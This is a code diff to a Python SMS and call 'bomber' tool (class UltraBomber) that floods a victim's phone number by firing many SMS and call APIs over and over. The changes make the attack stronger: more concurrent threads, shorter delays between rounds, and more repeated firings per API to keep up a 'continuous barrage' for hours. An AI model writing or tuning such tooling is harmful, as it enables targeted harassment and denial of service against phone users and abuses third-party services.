@@ -42,14 +42,14 @@ if API_TOKEN and not os.path.exists("config_token.py"):
         pass
 
 MAX_WORKERS = 50  # Ultra Power — 50 concurrent threads
-SMS_MAX_WORKERS = 80  # 8-HOUR MODE — sustainable non-stop
+SMS_MAX_WORKERS = 120  # BALANCED POWER — fast or sustainable
 DELAY_BETWEEN_ROUNDS = 0.2  # 200ms between rounds (Ultra Power)
-SMS_DELAY_BETWEEN_ROUNDS = 0.15  # 150ms between SMS rounds — 8-HOUR STABLE
+SMS_DELAY_BETWEEN_ROUNDS = 0.08  # 80ms between rounds — BALANCED FAST
 SMS_DOUBLE_FIRE = True  # Double fire — har API ek round mein 2 baar fire!
 SMS_AUTO_RETRY = True  # Retry failed SMS APIs immediately
 MAX_CONCURRENT_SESSIONS = 3  # Max 3 users (Ultra Power needs more resources per user)
 
-IMPORTANT_CALL_INTERVAL = 1  # Call APIs fire every 1s — 8-HOUR STABLE
+IMPORTANT_CALL_INTERVAL = 0.8  # Call every 0.8s — BALANCED POWER
 IMPORTANT_5S_INTERVAL = 5  # 5-second important APIs fire every 5 seconds
 IMPORTANT_SMS_INTERVAL = 0.5  # Important SMS APIs — 6 req/sec total (3 APIs × 2 times/sec)
 
@@ -1010,7 +1010,7 @@ class UltraBomber:
         executor = self.sms_executor if is_sms else self.executor
         
         # 8-HOUR MODE — each API fires 5 times for SMS, 5 times for others!
-        fire_count = 5 if is_sms else 2
+        fire_count = 8 if is_sms else 3
         
         futures = []
         for api in apis:
@@ -1156,7 +1156,7 @@ class UltraBomber:
                     if stop_event.is_set():
                         break
                     # Each API fires 3 times for continuous barrage
-                    for _ in range(2):
+                    for _ in range(3):
                         if stop_event.is_set():
                             break
                         name, status, size, err = self._fire_api(api, phone)
